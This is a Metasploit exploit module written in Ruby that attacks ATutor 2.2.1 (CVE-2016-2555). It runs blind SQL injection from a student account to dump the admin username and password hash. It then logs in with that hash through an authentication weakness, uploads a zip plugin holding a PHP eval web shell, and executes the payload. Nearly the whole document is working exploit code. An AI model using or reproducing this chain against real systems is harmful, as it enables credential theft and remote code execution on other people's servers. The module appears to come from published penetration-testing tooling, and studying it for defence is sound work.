# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ATutor 2.2.1 SQL Injection / Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
         This module exploits a SQL Injection vulnerability and an authentication weakness
         vulnerability in ATutor. This essentially means an attacker can bypass authenication
         and reach the administrators interface where they can upload malcious code.
 
         You are required to login to the target to reach the SQL Injection, however this
         can be done as a student account and remote registration is enabled by default.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;, # initial discovery, msf code
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2016-2555&#039;  ],
          [ &#039;URL&#039;, &#039;http://www.atutor.ca/&#039; ] # Official Website
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Mar 1 2016&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of Atutor&#039;, &#039;/ATutor/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;])
      ],self.class)
  end
 
  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_error(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_good(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def check
    # the only way to test if the target is vuln
    begin
      test_cookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], false)
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      return Exploit::CheckCode::Unknown
    end
 
    if test_injection(test_cookie)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def create_zip_file
    zip_file      = Rex::Zip::Archive.new
    @header       = Rex::Text.rand_text_alpha_upper(4)
    @payload_name = Rex::Text.rand_text_alpha_lower(4)
    @plugin_name  = Rex::Text.rand_text_alpha_lower(3)
 
    path = "#{@plugin_name}/#{@payload_name}.php"
    register_file_for_cleanup("#{@payload_name}.php", "../../content/module/#{path}")
 
    zip_file.add_file(path, "<?php eval(base64_decode($_SERVER[&#039;HTTP_#{@header}&#039;])); ?>")
    zip_file.pack
  end
 
  def exec_code
    send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "mods", @plugin_name, "#{@payload_name}.php"),
      &#039;raw_headers&#039; => "#{@header}: #{Rex::Text.encode_base64(payload.encoded)}\r\n"
    })
  end
 
  def upload_shell(cookie)
    post_data = Rex::MIME::Message.new
    post_data.add_part(create_zip_file, &#039;archive/zip&#039;, nil, "form-data; name=\"modulefile\"; filename=\"#{@plugin_name}.zip\"")
    post_data.add_part("#{Rex::Text.rand_text_alpha_upper(4)}", nil, nil, "form-data; name=\"install_upload\"")
    data = post_data.to_s
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "mods", "_core", "modules", "install_modules.php"),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => cookie,
      &#039;agent&#039; => &#039;Mozilla&#039;
    })
 
    if res && res.code == 302 && res.redirection.to_s.include?("module_install_step_1.php?mod=#{@plugin_name}")
       res = send_request_cgi({
         &#039;method&#039; => &#039;GET&#039;,
         &#039;uri&#039;    => normalize_uri(target_uri.path, "mods", "_core", "modules", res.redirection),
         &#039;cookie&#039; => cookie,
         &#039;agent&#039;  => &#039;Mozilla&#039;,
       })
       if res && res.code == 302 && res.redirection.to_s.include?("module_install_step_2.php?mod=#{@plugin_name}")
          res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => normalize_uri(target_uri.path, "mods", "_core", "modules", "module_install_step_2.php?mod=#{@plugin_name}"),
            &#039;cookie&#039; => cookie,
            &#039;agent&#039;  => &#039;Mozilla&#039;,
          })
       return true
       end
    end
 
    # auth failed if we land here, bail
    fail_with(Failure::Unknown, "Unable to upload php code")
    return false
  end
 
  def get_hashed_password(token, password, bypass)
    if bypass
      return Rex::Text.sha1(password + token)
    else
      return Rex::Text.sha1(Rex::Text.sha1(password) + token)
    end
  end
 
  def login(username, password, bypass)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "login.php"),
      &#039;agent&#039; => &#039;Mozilla&#039;,
    })
 
    token = $1 if res.body =~ /\) \+ \"(.*)\"\);/
    cookie = "ATutorID=#{$1};" if res.get_cookies =~ /; ATutorID=(.*); ATutorID=/
    if bypass
      password = get_hashed_password(token, password, true)
    else
      password = get_hashed_password(token, password, false)
    end
 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "login.php"),
      &#039;vars_post&#039; => {
        &#039;form_password_hidden&#039; => password,
        &#039;form_login&#039; => username,
        &#039;submit&#039; => &#039;Login&#039;
      },
      &#039;cookie&#039; => cookie,
      &#039;agent&#039; => &#039;Mozilla&#039;
    })
    cookie = "ATutorID=#{$2};" if res.get_cookies =~ /(.*); ATutorID=(.*);/
 
    # this is what happens when no state is maintained by the http client
    if res && res.code == 302
       if res.redirection.to_s.include?(&#039;bounce.php?course=0&#039;)
        res = send_request_cgi({
          &#039;method&#039;   => &#039;GET&#039;,
          &#039;uri&#039;      => normalize_uri(target_uri.path, res.redirection),
          &#039;cookie&#039; => cookie,
          &#039;agent&#039; => &#039;Mozilla&#039;
        })
        cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
        if res && res.code == 302 && res.redirection.to_s.include?(&#039;users/index.php&#039;)
           res = send_request_cgi({
             &#039;method&#039;   => &#039;GET&#039;,
             &#039;uri&#039;      => normalize_uri(target_uri.path, res.redirection),
             &#039;cookie&#039; => cookie,
             &#039;agent&#039; => &#039;Mozilla&#039;
           })
           cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
           return cookie
          end
       else res.redirection.to_s.include?(&#039;admin/index.php&#039;)
          # if we made it here, we are admin
          return cookie
       end
    end
 
    # auth failed if we land here, bail
    fail_with(Failure::NoAccess, "Authentication failed with username #{username}")
    return nil
  end
 
  def perform_request(sqli, cookie)
    # the search requires a minimum of 3 chars
    sqli = "#{Rex::Text.rand_text_alpha(3)}&#039;/**/or/**/#{sqli}/**/or/**/1=&#039;"
    rand_key = Rex::Text.rand_text_alpha(1)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "mods", "_standard", "social", "connections.php"),
      &#039;vars_post&#039; => {
        "search_friends_#{rand_key}" => sqli,
        &#039;rand_key&#039; => rand_key,
        &#039;search&#039; => &#039;Search People&#039;
      },
      &#039;cookie&#039; => cookie,
      &#039;agent&#039; => &#039;Mozilla&#039;
    })
    return res.body
  end
 
   def dump_the_hash(cookie)
    extracted_hash = ""
    sqli = "(select/**/length(concat(login,0x3a,password))/**/from/**/AT_admins/**/limit/**/0,1)"
    login_and_hash_length = generate_sql_and_test(do_true=false, do_test=false, sql=sqli, cookie).to_i
    for i in 1..login_and_hash_length
       sqli = "ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/AT_admins/**/limit/**/0,1),#{i},1))"
       asciival = generate_sql_and_test(false, false, sqli, cookie)
       if asciival >= 0
          extracted_hash << asciival.chr
       end
    end
    return extracted_hash.split(":")
  end
 
  def get_ascii_value(sql, cookie)
    lower = 0
    upper = 126
    while lower < upper
       mid = (lower + upper) / 2
       sqli = "#{sql}>#{mid}"
       result = perform_request(sqli, cookie)
       if result =~ /There are \d entries./
        lower = mid + 1
       else
        upper = mid
       end
    end
    if lower > 0 and lower < 126
       value = lower
    else
       sqli = "#{sql}=#{lower}"
       result = perform_request(sqli, cookie)
       if result =~ /There are \d entries./
          value = lower
       end
    end
    return value
  end
 
  def generate_sql_and_test(do_true=false, do_test=false, sql=nil, cookie)
    if do_test
      if do_true
        result = perform_request("1=1", cookie)
        if result =~ /There are \d entries./
          return true
        end
      else not do_true
        result = perform_request("1=2", cookie)
        if not result =~ /There are \d entries./
          return true
        end
      end
    elsif not do_test and sql
      return get_ascii_value(sql, cookie)
    end
  end
 
  def test_injection(cookie)
    if generate_sql_and_test(do_true=true, do_test=true, sql=nil, cookie)
       if generate_sql_and_test(do_true=false, do_test=true, sql=nil, cookie)
        return true
       end
    end
    return false
  end
 
  def report_cred(opts)
    service_data = {
      address: rhost,
      port: rport,
      service_name: ssl ? &#039;https&#039; : &#039;http&#039;,
      protocol: &#039;tcp&#039;,
      workspace_id: myworkspace_id
    }
 
    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      private_data: opts[:password],
      origin_type: :service,
      private_type: :password,
      username: opts[:user]
    }.merge(service_data)
 
    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      last_attempted_at: Time.now
    }.merge(service_data)
 
    create_credential_login(login_data)
  end
 
  def exploit
    student_cookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], false)
    print_status("Logged in as #{datastore[&#039;USERNAME&#039;]}, sending a few test injections...")
    report_cred(user: datastore[&#039;USERNAME&#039;], password: datastore[&#039;PASSWORD&#039;])
 
    print_status("Dumping username and password hash...")
    # we got admin hash now
    credz = dump_the_hash(student_cookie)
    print_good("Got the #{credz[0]} hash: #{credz[1]} !")
    if credz
      admin_cookie = login(credz[0], credz[1], true)
      print_status("Logged in as #{credz[0]}, uploading shell...")
      # install a plugin
      if upload_shell(admin_cookie)
        print_good("Shell upload successful!")
        # boom
        exec_code
      end
    end
  end
end

